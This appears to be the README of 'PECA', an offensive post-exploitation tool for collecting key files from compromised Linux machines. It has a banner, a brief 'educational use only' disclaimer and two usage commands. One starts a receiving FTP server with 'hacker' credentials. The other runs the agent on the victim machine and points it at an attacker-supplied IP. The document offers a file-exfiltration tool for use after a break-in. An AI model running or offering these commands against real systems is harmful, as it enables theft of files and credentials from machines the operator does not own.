# PECA
Post Exploitation Collection Agent

Note: For educational use only
```
            ____  _______________
           / __ \/ ____/ ____/   |
          / /_/ / __/ / /   / /| |
         / ____/ /___/ /___/ ___ |
        /_/   /_____/\____/_/  |_|
    Post Exploitation Collection Agent 
```
##### Intro:
    Peca was designed to help collect key files from linux machines after exploitation has occured.
    
##### Use:

Simple start the server *Sudo is needed for port 21*
```
    ./server.py --ip <iphere> --port 21 --user hacker --password hacker
```

Then drop the peca script on the client
```
    ./peca.py --server <iphere> --port 21 --user hacker --password hacker
```
